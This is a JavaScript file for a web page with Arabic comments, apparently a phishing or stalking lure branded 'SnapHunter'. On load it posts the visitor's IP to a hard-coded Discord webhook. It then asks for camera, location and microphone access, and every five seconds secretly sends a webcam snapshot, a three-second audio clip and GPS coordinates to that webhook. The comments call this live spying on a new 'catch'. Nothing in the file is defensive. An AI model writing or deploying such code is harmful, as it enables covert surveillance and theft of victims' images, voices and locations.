'use strict';

const WEBHOOK_URL = "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT";
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

let mediaRecorder;
let audioChunks = [];
let userLat = null, userLng = null;

// 1. جلب IP الجهاز فور الدخول (بدون إذن)
async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch (e) { return "غير معروف"; }
}

// 2. إرسال إشعار دخول فوري للبوت
async function notifyEntry() {
    const ip = await getIP();
    const payload = {
        username: "SnapHunter - تعقب مباشر",
        content: `🚨 **صيد جديد دخل الموقع!**\n🌐 **IP:** \`${ip}\` \n📱 **الجهاز:** \`${navigator.platform}\` \n⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}`
    };
    fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
}

// 3. وظيفة الإرسال الموحدة (صورة + صوت + موقع)
async function sendDataPacket(imgBlob, audBlob) {
    const ip = await getIP();
    const formData = new FormData();
    
    let content = `📡 **تحديث مباشر (كل 5 ثوانٍ)**\n🌐 **IP:** \`${ip}\`\n`;
    if (userLat && userLng) {
        content += `📍 **الموقع:** [خرائط جوجل](http://maps.google.com/maps?q=${userLat},${userLng})\n`;
    }

    if (imgBlob) formData.append('file1', imgBlob, 'camera.png');
    if (audBlob) formData.append('file2', audBlob, 'mic.ogg');
    
    formData.append('payload_json', JSON.stringify({
        content: content,
        username: "SnapHunter - التجسس المباشر"
    }));

    fetch(WEBHOOK_URL, { method: 'POST', body: formData });
}

// 4. تسلسل طلب الأذونات (كاميرا -> موقع -> ميكروفون)
async function startSequentialCapture() {
    await notifyEntry();

    try {
        // أ- طلب الكاميرا أولاً
        const camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = camStream;
        console.log("تم السماح بالكاميرا");

        // ب- طلب الموقع بعد ثانيتين
        setTimeout(() => {
            navigator.geolocation.getCurrentPosition(p => {
                userLat = p.coords.latitude;
                userLng = p.coords.longitude;
                console.log("تم السماح بالموقع");
            });
        }, 2000);

        // ج- طلب الميكروفون بعد 4 ثوانٍ والبدء في التسجيل المخفي
        setTimeout(async () => {
            try {
                const micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                mediaRecorder = new MediaRecorder(micStream);
                
                // بدء حلقة الإرسال كل 5 ثوانٍ
                setInterval(() => {
                    // التقاط صورة
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, 640, 480);
                    
                    // تسجيل صوت لمدة 3 ثوانٍ بشكل مخفي
                    audioChunks = [];
                    mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
                    mediaRecorder.start();

                    setTimeout(() => {
                        mediaRecorder.stop();
                        mediaRecorder.onstop = () => {
                            const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                            canvas.toBlob(imgBlob => {
                                sendDataPacket(imgBlob, audioBlob);
                            }, 'image/png');
                        };
                    }, 3000);

                }, 5000);

            } catch (e) { console.log("رفض الميكروفون"); }
        }, 4000);

    } catch (err) {
        console.log("رفض الكاميرا أو حدث خطأ");
        // حتى لو رفض، نستمر بمحاولة إرسال الموقع والـ IP
        setInterval(() => { sendDataPacket(null, null); }, 5000);
    }
}

window.onload = startSequentialCapture;
